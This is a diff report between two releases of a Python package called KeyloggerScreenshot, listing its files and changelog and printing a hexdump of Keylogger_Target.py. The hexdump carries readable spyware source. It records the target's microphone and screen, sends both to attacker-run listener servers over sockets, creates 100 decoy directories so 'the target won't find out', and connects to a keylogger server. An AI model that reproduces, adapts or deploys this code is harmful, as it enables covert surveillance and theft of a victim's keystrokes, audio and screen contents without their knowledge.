@@ -1,0 +1,1728 @@
+# Comparing `tmp/KeyloggerScreenshot-0.3.0.tar.gz` & `tmp/KeyloggerScreenshot-0.3.1.tar.gz`
+
+## filetype from file(1)
+
+```diff
+@@ -1 +1 @@
+-gzip compressed data, was "KeyloggerScreenshot-0.3.0.tar", last modified: Thu Apr 20 09:22:35 2023, max compression
++gzip compressed data, was "KeyloggerScreenshot-0.3.1.tar", last modified: Tue Apr 25 22:40:01 2023, max compression
+```
+
+## Comparing `KeyloggerScreenshot-0.3.0.tar` & `KeyloggerScreenshot-0.3.1.tar`
+
+### file list
+
+```diff
+@@ -1,31 +1,31 @@
+-drwxrwxrwx   0        0        0        0 2023-04-20 09:22:35.518975 KeyloggerScreenshot-0.3.0/
+--rw-rw-rw-   0        0        0     3552 2023-04-20 09:19:21.000000 KeyloggerScreenshot-0.3.0/CHANGELOG.txt
+--rw-rw-rw-   0        0        0    12113 2023-04-20 09:11:01.000000 KeyloggerScreenshot-0.3.0/KLS_start.py
+-drwxrwxrwx   0        0        0        0 2023-04-20 09:22:35.484232 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/
+--rw-rw-rw-   0        0        0    11746 2023-04-14 22:50:53.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Keylogger_Target.py
+--rw-rw-rw-   0        0        0     1917 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Port_data.py
+--rw-rw-rw-   0        0        0     5750 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_keylogger.py
+--rw-rw-rw-   0        0        0     2573 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_listener.py
+--rw-rw-rw-   0        0        0     3883 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_photos.py
+--rw-rw-rw-   0        0        0     1722 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Server_timer.py
+--rw-rw-rw-   0        0        0     5184 2023-04-20 08:15:29.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Simulation_code.py
+--rw-rw-rw-   0        0        0      277 2023-04-10 17:12:29.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/__init__.py
+-drwxrwxrwx   0        0        0        0 2023-04-20 09:22:35.515474 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/
+--rw-rw-rw-   0        0        0     9450 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/PKG-INFO
+--rw-rw-rw-   0        0        0      661 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/SOURCES.txt
+--rw-rw-rw-   0        0        0        1 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/dependency_links.txt
+--rw-rw-rw-   0        0        0       47 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/requires.txt
+--rw-rw-rw-   0        0        0       20 2023-04-20 09:22:35.000000 KeyloggerScreenshot-0.3.0/KeyloggerScreenshot.egg-info/top_level.txt
+--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.0/LISCENCE.txt
+--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.0/MANIFEST.in
+--rw-rw-rw-   0        0        0     9450 2023-04-20 09:22:35.517995 KeyloggerScreenshot-0.3.0/PKG-INFO
+--rw-rw-rw-   0        0        0     5137 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.3.0/README.md
+--rw-rw-rw-   0        0        0      388 2023-03-04 16:59:26.000000 KeyloggerScreenshot-0.3.0/client.py
+--rw-rw-rw-   0        0        0      662 2023-04-20 06:44:28.000000 KeyloggerScreenshot-0.3.0/demon_server.py
+--rw-rw-rw-   0        0        0    39374 2023-03-14 06:49:49.000000 KeyloggerScreenshot-0.3.0/img_1.png
+--rw-rw-rw-   0        0        0      923 2023-03-28 06:01:03.000000 KeyloggerScreenshot-0.3.0/leo_gui.py
+--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.3.0/requirements.py
+--rw-rw-rw-   0        0        0       42 2023-04-20 09:22:35.519956 KeyloggerScreenshot-0.3.0/setup.cfg
+--rw-rw-rw-   0        0        0     1075 2023-04-20 09:21:26.000000 KeyloggerScreenshot-0.3.0/setup.py
+--rw-rw-rw-   0        0        0      196 2023-04-20 07:58:37.000000 KeyloggerScreenshot-0.3.0/target.py
+--rw-rw-rw-   0        0        0      409 2023-04-20 08:15:29.000000 KeyloggerScreenshot-0.3.0/test.py
++drwxrwxrwx   0        0        0        0 2023-04-25 22:40:01.810151 KeyloggerScreenshot-0.3.1/
++-rw-rw-rw-   0        0        0     3647 2023-04-25 22:39:55.000000 KeyloggerScreenshot-0.3.1/CHANGELOG.txt
++-rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.3.1/KLS_start.py
++drwxrwxrwx   0        0        0        0 2023-04-25 22:40:01.750888 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/
++-rw-rw-rw-   0        0        0    12464 2023-04-21 18:17:34.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Keylogger_Target.py
++-rw-rw-rw-   0        0        0     1917 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Port_data.py
++-rw-rw-rw-   0        0        0     5750 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_keylogger.py
++-rw-rw-rw-   0        0        0     2573 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_listener.py
++-rw-rw-rw-   0        0        0     3883 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_photos.py
++-rw-rw-rw-   0        0        0     1722 2023-04-10 17:11:39.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Server_timer.py
++-rw-rw-rw-   0        0        0     6048 2023-04-25 22:36:36.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Simulation_code.py
++-rw-rw-rw-   0        0        0      277 2023-04-21 18:13:13.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/__init__.py
++drwxrwxrwx   0        0        0        0 2023-04-25 22:40:01.806070 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/
++-rw-rw-rw-   0        0        0     9547 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/PKG-INFO
++-rw-rw-rw-   0        0        0      672 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/SOURCES.txt
++-rw-rw-rw-   0        0        0        1 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/dependency_links.txt
++-rw-rw-rw-   0        0        0       47 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/requires.txt
++-rw-rw-rw-   0        0        0       20 2023-04-25 22:40:01.000000 KeyloggerScreenshot-0.3.1/KeyloggerScreenshot.egg-info/top_level.txt
++-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.1/LISCENCE.txt
++-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.3.1/MANIFEST.in
++-rw-rw-rw-   0        0        0     9547 2023-04-25 22:40:01.810151 KeyloggerScreenshot-0.3.1/PKG-INFO
++-rw-rw-rw-   0        0        0     5137 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.3.1/README.md
++-rw-rw-rw-   0        0        0     6359 2023-04-25 22:36:36.000000 KeyloggerScreenshot-0.3.1/Simulation_code.py
++-rw-rw-rw-   0        0        0      388 2023-03-04 16:59:26.000000 KeyloggerScreenshot-0.3.1/client.py
++-rw-rw-rw-   0        0        0      660 2023-04-21 17:48:40.000000 KeyloggerScreenshot-0.3.1/demon_server.py
++-rw-rw-rw-   0        0        0    39374 2023-03-14 06:49:49.000000 KeyloggerScreenshot-0.3.1/img_1.png
++-rw-rw-rw-   0        0        0      923 2023-03-28 06:01:03.000000 KeyloggerScreenshot-0.3.1/leo_gui.py
++-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.3.1/requirements.py
++-rw-rw-rw-   0        0        0       42 2023-04-25 22:40:01.814166 KeyloggerScreenshot-0.3.1/setup.cfg
++-rw-rw-rw-   0        0        0     1075 2023-04-25 22:39:55.000000 KeyloggerScreenshot-0.3.1/setup.py
++-rw-rw-rw-   0        0        0      175 2023-04-21 17:56:13.000000 KeyloggerScreenshot-0.3.1/target.py
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/CHANGELOG.txt` & `KeyloggerScreenshot-0.3.1/CHANGELOG.txt`
+
+ * *Files 5% similar despite different names*
+
+```diff
+@@ -137,11 +137,17 @@
+ 
+ 0.2.9.1 (15/04/2023)
+ --------------------
+ - Data which the target has pasted will now be shown on the server
+ - Documentation incoming
+ 
+ 0.3.0 (20/04/2023)
++---------------------
+ - Simulation now stops after stop button is pressed
+ - Bug fixes
+ - New Code on "Simulation_code.py" and on "KLS_Start.py"
+ - New files on github https://github.com/Kill0geR/KeyloggerScreenshot
++
++0.3.1 (26/04/2023)
++---------------------
++- Bug fixes
++- Cleaner Code
+```
+
+### Comparing `KeyloggerScreenshot-0.3.0/KLS_start.py` & `KeyloggerScreenshot-0.3.1/KLS_start.py`
+
+ * *Files identical despite different names*
+
+### Comparing `KeyloggerScreenshot-0.3.0/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.3.1/KeyloggerScreenshot/Keylogger_Target.py`
+
+ * *Files 4% similar despite different names*
+
+```diff
+@@ -85,651 +85,695 @@
+ 00000540: 6e67 5f77 6562 0d0a 0d0a 2020 2020 2020  ng_web....      
+ 00000550: 2020 7365 6c66 2e63 6865 636b 203d 205b    self.check = [
+ 00000560: 5d0d 0a20 2020 2020 2020 2073 656c 662e  ]..        self.
+ 00000570: 6361 7073 203d 2046 616c 7365 0d0a 2020  caps = False..  
+ 00000580: 2020 2020 2020 7365 6c66 2e72 6963 6874        self.richt
+ 00000590: 6967 655f 6c69 7374 6520 3d20 5b5d 0d0a  ige_liste = []..
+ 000005a0: 2020 2020 2020 2020 7365 6c66 2e63 6f6f          self.coo
+-000005b0: 7264 696e 6174 6573 203d 205b 5d0d 0a0d  rdinates = []...
+-000005c0: 0a20 2020 2064 6566 2064 6174 656e 5f61  .    def daten_a
+-000005d0: 7566 6e65 6865 6d65 6e28 7365 6c66 293a  ufnehemen(self):
+-000005e0: 0d0a 2020 2020 2020 2020 6c69 7374 656e  ..        listen
+-000005f0: 696e 675f 6461 7461 203d 2073 6f63 6b65  ing_data = socke
+-00000600: 742e 736f 636b 6574 2873 6f63 6b65 742e  t.socket(socket.
+-00000610: 4146 5f49 4e45 542c 2073 6f63 6b65 742e  AF_INET, socket.
+-00000620: 534f 434b 5f53 5452 4541 4d29 0d0a 2020  SOCK_STREAM)..  
+-00000630: 2020 2020 2020 6c69 7374 656e 696e 675f        listening_
+-00000640: 6461 7461 2e63 6f6e 6e65 6374 2828 7365  data.connect((se
+-00000650: 6c66 2e69 705f 6c69 7374 656e 6572 2c20  lf.ip_listener, 
+-00000660: 7365 6c66 2e70 6f72 745f 6c69 7374 656e  self.port_listen
+-00000670: 6572 2929 0d0a 2020 2020 2020 2020 7472  er))..        tr
+-00000680: 793a 0d0a 2020 2020 2020 2020 2020 2020  y:..            
+-00000690: 666f 726d 6174 203d 2070 7961 7564 696f  format = pyaudio
+-000006a0: 2e70 6149 6e74 3136 0d0a 2020 2020 2020  .paInt16..      
+-000006b0: 2020 2020 2020 6368 616e 6e65 6c73 203d        channels =
+-000006c0: 2032 0d0a 2020 2020 2020 2020 2020 2020   2..            
+-000006d0: 7261 7465 203d 2034 3431 3030 0d0a 2020  rate = 44100..  
+-000006e0: 2020 2020 2020 2020 2020 6368 756e 6b20            chunk 
+-000006f0: 3d20 3130 3234 0d0a 2020 2020 2020 2020  = 1024..        
+-00000700: 2020 2020 7365 636f 6e64 7320 3d20 7365      seconds = se
+-00000710: 6c66 2e64 7572 6174 696f 6e20 2b20 310d  lf.duration + 1.
+-00000720: 0a0d 0a20 2020 2020 2020 2020 2020 2061  ...            a
+-00000730: 7564 696f 203d 2070 7961 7564 696f 2e50  udio = pyaudio.P
+-00000740: 7941 7564 696f 2829 0d0a 0d0a 2020 2020  yAudio()....    
+-00000750: 2020 2020 2020 2020 2320 7374 6172 7420          # start 
+-00000760: 5265 636f 7264 696e 670d 0a20 2020 2020  Recording..     
+-00000770: 2020 2020 2020 2073 7472 6561 6d20 3d20         stream = 
+-00000780: 6175 6469 6f2e 6f70 656e 2866 6f72 6d61  audio.open(forma
+-00000790: 743d 666f 726d 6174 2c20 6368 616e 6e65  t=format, channe
+-000007a0: 6c73 3d63 6861 6e6e 656c 732c 0d0a 2020  ls=channels,..  
+-000007b0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-000007c0: 2020 2020 2020 2020 2020 2020 2020 7261                ra
+-000007d0: 7465 3d72 6174 652c 2069 6e70 7574 3d54  te=rate, input=T
+-000007e0: 7275 652c 0d0a 2020 2020 2020 2020 2020  rue,..          
+-000007f0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00000800: 2020 2020 2020 6672 616d 6573 5f70 6572        frames_per
+-00000810: 5f62 7566 6665 723d 6368 756e 6b29 0d0a  _buffer=chunk)..
+-00000820: 2020 2020 2020 2020 2020 2020 2320 7072              # pr
+-00000830: 696e 7428 2272 6563 6f72 6469 6e67 2e2e  int("recording..
+-00000840: 2e22 290d 0a20 2020 2020 2020 2020 2020  .")..           
+-00000850: 2066 7261 6d65 7320 3d20 5b5d 0d0a 0d0a   frames = []....
+-00000860: 2020 2020 2020 2020 2020 2020 666f 7220              for 
+-00000870: 6920 696e 2072 616e 6765 2830 2c20 696e  i in range(0, in
+-00000880: 7428 7261 7465 202f 2063 6875 6e6b 202a  t(rate / chunk *
+-00000890: 2073 6563 6f6e 6473 2929 3a0d 0a20 2020   seconds)):..   
+-000008a0: 2020 2020 2020 2020 2020 2020 2064 6174               dat
+-000008b0: 6120 3d20 7374 7265 616d 2e72 6561 6428  a = stream.read(
+-000008c0: 6368 756e 6b29 0d0a 2020 2020 2020 2020  chunk)..        
+-000008d0: 2020 2020 2020 2020 6672 616d 6573 2e61          frames.a
+-000008e0: 7070 656e 6428 6461 7461 290d 0a0d 0a20  ppend(data).... 
+-000008f0: 2020 2020 2020 2020 2020 2023 2070 7269             # pri
+-00000900: 6e74 2822 6669 6e69 7368 6564 2072 6563  nt("finished rec
+-00000910: 6f72 6469 6e67 2229 0d0a 0d0a 2020 2020  ording")....    
+-00000920: 2020 2020 2020 2020 2320 7374 6f70 2052          # stop R
+-00000930: 6563 6f72 6469 6e67 0d0a 2020 2020 2020  ecording..      
+-00000940: 2020 2020 2020 7374 7265 616d 2e73 746f        stream.sto
+-00000950: 705f 7374 7265 616d 2829 0d0a 2020 2020  p_stream()..    
+-00000960: 2020 2020 2020 2020 7374 7265 616d 2e63          stream.c
+-00000970: 6c6f 7365 2829 0d0a 2020 2020 2020 2020  lose()..        
+-00000980: 2020 2020 6175 6469 6f2e 7465 726d 696e      audio.termin
+-00000990: 6174 6528 290d 0a0d 0a20 2020 2020 2020  ate()....       
+-000009a0: 2020 2020 2023 2043 6f6e 6e65 6374 696f       # Connectio
+-000009b0: 6e20 7769 7468 2053 6572 7665 724c 6973  n with ServerLis
+-000009c0: 7465 6e65 720d 0a0d 0a20 2020 2020 2020  tener....       
+-000009d0: 2020 2020 2073 7472 5f66 7261 6d65 7320       str_frames 
+-000009e0: 3d20 7374 7228 6672 616d 6573 290d 0a20  = str(frames).. 
+-000009f0: 2020 2020 2020 2020 2020 206c 6973 7465             liste
+-00000a00: 6e69 6e67 5f64 6174 612e 7365 6e64 2873  ning_data.send(s
+-00000a10: 7472 5f66 7261 6d65 732e 656e 636f 6465  tr_frames.encode
+-00000a20: 2829 290d 0a0d 0a20 2020 2020 2020 2065  ())....        e
+-00000a30: 7863 6570 7420 4f53 4572 726f 723a 0d0a  xcept OSError:..
+-00000a40: 2020 2020 2020 2020 2020 2020 7072 696e              prin
+-00000a50: 7428 224e 4f20 4d49 4352 4f50 484f 4e45  t("NO MICROPHONE
+-00000a60: 2044 4554 4543 5445 4420 4f52 204d 4943   DETECTED OR MIC
+-00000a70: 524f 5048 4f4e 4520 5345 5454 494e 4720  ROPHONE SETTING 
+-00000a80: 4449 5341 424c 4544 2229 0d0a 2020 2020  DISABLED")..    
+-00000a90: 2020 2020 2020 2020 6e6f 5f6d 6963 726f          no_micro
+-00000aa0: 666f 6e20 3d20 2254 4845 2054 4152 4745  fon = "THE TARGE
+-00000ab0: 5420 4841 5320 4e4f 204d 4943 524f 5048  T HAS NO MICROPH
+-00000ac0: 4f4e 4520 4f4e 220d 0a20 2020 2020 2020  ONE ON"..       
+-00000ad0: 2020 2020 206c 6973 7465 6e69 6e67 5f64       listening_d
+-00000ae0: 6174 612e 7365 6e64 286e 6f5f 6d69 6372  ata.send(no_micr
+-00000af0: 6f66 6f6e 2e65 6e63 6f64 6528 2929 0d0a  ofon.encode())..
+-00000b00: 2020 2020 2020 2020 2020 2020 2320 5365              # Se
+-00000b10: 6e64 7320 6461 7461 2074 6f20 5365 7276  nds data to Serv
+-00000b20: 6572 4c69 7374 656e 6572 0d0a 0d0a 2020  erListener....  
+-00000b30: 2020 6465 6620 616c 6c5f 6469 7228 7365    def all_dir(se
+-00000b40: 6c66 293a 0d0a 2020 2020 2020 2020 676c  lf):..        gl
+-00000b50: 6f62 616c 2072 616e 646f 6d5f 6c73 740d  obal random_lst.
+-00000b60: 0a20 2020 2020 2020 207a 6569 6368 656e  .        zeichen
+-00000b70: 203d 2022 7177 6572 747a 7569 6f70 6173   = "qwertzuiopas
+-00000b80: 6466 6768 6a6b 6c79 7863 7662 6e6d 3132  dfghjklyxcvbnm12
+-00000b90: 3334 3536 3738 3930 220d 0a20 2020 2020  34567890"..     
+-00000ba0: 2020 2072 616e 646f 6d5f 6c73 7420 3d20     random_lst = 
+-00000bb0: 5b22 222e 6a6f 696e 2872 616e 646f 6d2e  ["".join(random.
+-00000bc0: 7361 6d70 6c65 287a 6569 6368 656e 2c20  sample(zeichen, 
+-00000bd0: 7261 6e64 6f6d 2e72 616e 6469 6e74 2834  random.randint(4
+-00000be0: 2c20 3130 2929 2920 666f 7220 7820 696e  , 10))) for x in
+-00000bf0: 2072 616e 6765 2831 3030 295d 0d0a 2020   range(100)]..  
+-00000c00: 2020 2020 2020 2320 5468 6973 206d 616b        # This mak
+-00000c10: 6573 2061 206c 6973 7420 6f66 2065 7665  es a list of eve
+-00000c20: 7279 2064 6972 6563 746f 7279 206e 616d  ry directory nam
+-00000c30: 6520 7261 6e64 6f6d 6c79 0d0a 2020 2020  e randomly..    
+-00000c40: 2020 2020 666f 7220 6469 725f 6e61 6d65      for dir_name
+-00000c50: 2069 6e20 7261 6e64 6f6d 5f6c 7374 3a0d   in random_lst:.
+-00000c60: 0a20 2020 2020 2020 2020 2020 206f 732e  .            os.
+-00000c70: 7379 7374 656d 2866 226d 6b64 6972 207b  system(f"mkdir {
+-00000c80: 6469 725f 6e61 6d65 7d22 290d 0a20 2020  dir_name}")..   
+-00000c90: 2020 2020 2020 2020 2023 2054 6865 2064           # The d
+-00000ca0: 6972 6563 746f 7279 2069 7320 6265 696e  irectory is bein
+-00000cb0: 6720 6d61 6465 2068 6572 650d 0a0d 0a20  g made here.... 
+-00000cc0: 2020 2020 2020 2072 616e 646f 6d5f 6469         random_di
+-00000cd0: 7220 3d20 7261 6e64 6f6d 2e63 686f 6963  r = random.choic
+-00000ce0: 6528 7261 6e64 6f6d 5f6c 7374 290d 0a20  e(random_lst).. 
+-00000cf0: 2020 2020 2020 206f 732e 6368 6469 7228         os.chdir(
+-00000d00: 7261 6e64 6f6d 5f64 6972 290d 0a20 2020  random_dir)..   
+-00000d10: 2020 2020 2023 2057 6520 6172 6520 6e6f       # We are no
+-00000d20: 7720 696e 2074 6861 7420 6469 7265 6374  w in that direct
+-00000d30: 6f72 7920 7768 6572 6520 7468 6520 696d  ory where the im
+-00000d40: 6167 6520 6361 6e20 6265 2073 746f 7265  age can be store
+-00000d50: 640d 0a0d 0a20 2020 2064 6566 2063 6c69  d....    def cli
+-00000d60: 656e 7428 7365 6c66 2c20 6970 5f70 686f  ent(self, ip_pho
+-00000d70: 746f 732c 2070 6f72 745f 7068 6f74 6f73  tos, port_photos
+-00000d80: 293a 0d0a 2020 2020 2020 2020 676c 6f62  ):..        glob
+-00000d90: 616c 2066 6861 6e64 6c65 0d0a 2020 2020  al fhandle..    
+-00000da0: 2020 2020 2320 6668 616e 646c 6520 6973      # fhandle is
+-00000db0: 2074 6865 2076 6172 6961 626c 6520 7768   the variable wh
+-00000dc0: 6963 6820 6f70 656e 7320 7468 6520 666f  ich opens the fo
+-00000dd0: 746f 0d0a 2020 2020 2020 2020 7320 3d20  to..        s = 
+-00000de0: 736f 636b 6574 2e73 6f63 6b65 7428 736f  socket.socket(so
+-00000df0: 636b 6574 2e41 465f 494e 4554 2c20 736f  cket.AF_INET, so
+-00000e00: 636b 6574 2e53 4f43 4b5f 5354 5245 414d  cket.SOCK_STREAM
+-00000e10: 290d 0a20 2020 2020 2020 2073 2e63 6f6e  )..        s.con
+-00000e20: 6e65 6374 2828 6970 5f70 686f 746f 732c  nect((ip_photos,
+-00000e30: 2070 6f72 745f 7068 6f74 6f73 2929 0d0a   port_photos))..
+-00000e40: 2020 2020 2020 2020 2320 5468 6973 2063          # This c
+-00000e50: 6f6e 6e65 6374 7320 746f 2074 6865 2073  onnects to the s
+-00000e60: 6572 7665 7220 796f 7520 7370 6563 6966  erver you specif
+-00000e70: 6965 640d 0a20 2020 2020 2020 2069 6d61  ied..        ima
+-00000e80: 6765 203d 2070 672e 7363 7265 656e 7368  ge = pg.screensh
+-00000e90: 6f74 2829 0d0a 2020 2020 2020 2020 2320  ot()..        # 
+-00000ea0: 2269 6d61 6765 2220 7363 7265 656e 7368  "image" screensh
+-00000eb0: 6f74 7320 7468 6520 6375 7272 656e 7420  ots the current 
+-00000ec0: 696d 6167 6520 6166 7465 7220 6120 7370  image after a sp
+-00000ed0: 6563 6966 6963 2074 696d 650d 0a20 2020  ecific time..   
+-00000ee0: 2020 2020 2066 6f74 6f6e 616d 6520 3d20       fotoname = 
+-00000ef0: 2249 6d61 6765 2e70 6e67 220d 0a20 2020  "Image.png"..   
+-00000f00: 2020 2020 2023 204e 616d 6520 6f66 2074       # Name of t
+-00000f10: 6865 2069 6d61 6765 0d0a 2020 2020 2020  he image..      
+-00000f20: 2020 696d 6167 652e 7361 7665 2866 6f74    image.save(fot
+-00000f30: 6f6e 616d 6529 0d0a 2020 2020 2020 2020  oname)..        
+-00000f40: 2320 5361 7665 7320 7468 6520 696d 6167  # Saves the imag
+-00000f50: 6520 696e 2074 6865 2063 7572 7265 6e74  e in the current
+-00000f60: 2064 6972 6563 746f 7279 0d0a 2020 2020   directory..    
+-00000f70: 2020 2020 6668 616e 646c 6520 3d20 6f70      fhandle = op
+-00000f80: 656e 2866 6f74 6f6e 616d 652c 2022 7262  en(fotoname, "rb
+-00000f90: 2229 0d0a 2020 2020 2020 2020 2320 4f70  ")..        # Op
+-00000fa0: 656e 7320 7468 6520 696d 6167 650d 0a0d  ens the image...
+-00000fb0: 0a20 2020 2020 2020 2066 756c 6c5f 6d73  .        full_ms
+-00000fc0: 6720 3d20 6222 220d 0a20 2020 2020 2020  g = b""..       
+-00000fd0: 2023 2045 7665 7279 2069 6d61 6765 2069   # Every image i
+-00000fe0: 6e66 6f72 6d61 7469 6f6e 2077 696c 6c20  nformation will 
+-00000ff0: 6265 2073 746f 7265 6420 696e 2022 6675  be stored in "fu
+-00001000: 6c6c 5f6d 7367 220d 0a20 2020 2020 2020  ll_msg"..       
+-00001010: 2066 6f72 206c 696e 6520 696e 2066 6861   for line in fha
+-00001020: 6e64 6c65 3a0d 0a20 2020 2020 2020 2020  ndle:..         
+-00001030: 2020 2066 756c 6c5f 6d73 6720 2b3d 206c     full_msg += l
+-00001040: 696e 650d 0a0d 0a20 2020 2020 2020 2073  ine....        s
+-00001050: 2e73 656e 6428 6675 6c6c 5f6d 7367 290d  .send(full_msg).
+-00001060: 0a0d 0a20 2020 2064 6566 2063 6f75 6e74  ...    def count
+-00001070: 646f 776e 5f73 656e 6428 7365 6c66 2c20  down_send(self, 
+-00001080: 7a65 6974 2c20 6970 5f70 686f 746f 732c  zeit, ip_photos,
+-00001090: 2070 6f72 745f 7068 6f74 6f73 2c20 6970   port_photos, ip
+-000010a0: 5f6b 6579 6c6f 6767 6572 2c20 706f 7274  _keylogger, port
+-000010b0: 5f6b 6579 6c6f 6767 6572 293a 0d0a 2020  _keylogger):..  
+-000010c0: 2020 2020 2020 7365 636f 6e64 735f 6c69        seconds_li
+-000010d0: 7374 203d 205b 7a61 686c 2066 6f72 207a  st = [zahl for z
+-000010e0: 6168 6c20 696e 2072 616e 6765 2830 2c20  ahl in range(0, 
+-000010f0: 7a65 6974 202b 2031 2c20 3230 2920 6966  zeit + 1, 20) if
+-00001100: 207a 6168 6c20 213d 2030 5d0d 0a20 2020   zahl != 0]..   
+-00001110: 2020 2020 2023 2054 6865 2073 6563 6f6e       # The secon
+-00001120: 6473 2074 6865 2069 6d61 6765 2077 696c  ds the image wil
+-00001130: 6c20 6265 2073 656e 7420 696e 2032 3020  l be sent in 20 
+-00001140: 7374 6570 7320 746f 2074 6865 2073 6572  steps to the ser
+-00001150: 7665 7220 7769 6c6c 2062 6520 7361 7665  ver will be save
+-00001160: 6420 696e 2022 7365 636f 6e64 735f 6c69  d in "seconds_li
+-00001170: 7374 220d 0a20 2020 2020 2020 2070 7269  st"..        pri
+-00001180: 6e74 2873 6563 6f6e 6473 5f6c 6973 7429  nt(seconds_list)
+-00001190: 0d0a 2020 2020 2020 2020 6b65 795f 6461  ..        key_da
+-000011a0: 7461 203d 2073 6f63 6b65 742e 736f 636b  ta = socket.sock
+-000011b0: 6574 2873 6f63 6b65 742e 4146 5f49 4e45  et(socket.AF_INE
+-000011c0: 542c 2073 6f63 6b65 742e 534f 434b 5f53  T, socket.SOCK_S
+-000011d0: 5452 4541 4d29 0d0a 0d0a 2020 2020 2020  TREAM)....      
+-000011e0: 2020 7472 793a 0d0a 2020 2020 2020 2020    try:..        
+-000011f0: 2020 2020 666f 7220 7820 696e 2072 616e      for x in ran
+-00001200: 6765 287a 6569 7420 2b20 3129 3a0d 0a20  ge(zeit + 1):.. 
+-00001210: 2020 2020 2020 2020 2020 2020 2020 2069                 i
+-00001220: 6620 7820 3d3d 2032 303a 0d0a 2020 2020  f x == 20:..    
+-00001230: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00001240: 7365 6c66 2e61 6c6c 5f64 6972 2829 0d0a  self.all_dir()..
+-00001250: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00001260: 2020 2020 2320 5468 6973 2066 756e 6374      # This funct
+-00001270: 696f 6e20 6d61 6b65 7320 3130 3020 6669  ion makes 100 fi
+-00001280: 6c65 7320 746f 2073 746f 7265 2074 6865  les to store the
+-00001290: 2069 6d61 6765 2073 6f20 7468 6520 7461   image so the ta
+-000012a0: 7267 6574 2077 6f6e 2774 2066 696e 6420  rget won't find 
+-000012b0: 6f75 740d 0a20 2020 2020 2020 2020 2020  out..           
+-000012c0: 2020 2020 2070 7269 6e74 2878 290d 0a20       print(x).. 
+-000012d0: 2020 2020 2020 2020 2020 2020 2020 207a                 z
+-000012e0: 6569 7420 2d3d 2031 0d0a 2020 2020 2020  eit -= 1..      
+-000012f0: 2020 2020 2020 2020 2020 7469 6d65 2e73            time.s
+-00001300: 6c65 6570 2831 290d 0a20 2020 2020 2020  leep(1)..       
+-00001310: 2020 2020 2020 2020 2069 6620 7820 696e           if x in
+-00001320: 2073 6563 6f6e 6473 5f6c 6973 743a 0d0a   seconds_list:..
+-00001330: 2020 2020 2020 2020 2020 2020 2020 2020                  
+-00001340: 2020 2020 7365 6c66 2e63 6c69 656e 7428      self.client(
+-00001350: 6970 5f70 686f 746f 732c 2070 6f72 745f  ip_photos, port_
+-00001360: 7068 6f74 6f73 290d 0a20 2020 2020 2020  photos)..       
+-00001370: 2020 2020 2020 2020 2020 2020 2023 2054               # T
+-00001380: 6865 2069 6d61 6765 7320 7769 6c6c 2062  he images will b
+-00001390: 6520 7365 6e74 0d0a 2020 2020 2020 2020  e sent..        
+-000013a0: 2020 2020 6b65 795f 6461 7461 2e63 6f6e      key_data.con
+-000013b0: 6e65 6374 2828 6970 5f6b 6579 6c6f 6767  nect((ip_keylogg
+-000013c0: 6572 2c20 706f 7274 5f6b 6579 6c6f 6767  er, port_keylogg
+-000013d0: 6572 2929 0d0a 2020 2020 2020 2020 2020  er))..          
+-000013e0: 2020 2320 5468 6973 2069 7320 7468 6520    # This is the 
+-000013f0: 6970 2061 6e64 2074 6865 2070 6f72 7420  ip and the port 
+-00001400: 6f66 2074 6865 2073 6572 7665 7220 7468  of the server th
+-00001410: 6520 706f 7274 2073 686f 756c 646e 2774  e port shouldn't
